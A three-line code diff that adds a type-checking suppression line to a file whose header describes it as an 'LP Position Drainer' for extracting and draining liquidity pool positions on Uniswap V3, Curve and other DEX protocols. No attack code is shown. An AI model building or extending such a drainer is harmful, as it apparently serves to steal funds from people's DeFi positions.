@@ -1,3 +1,4 @@
+// @ts-nocheck
 /**
  * LP Position Drainer — Extract and drain liquidity pool positions
  * Handles: Uniswap V3, Curve, and other major DEX protocols
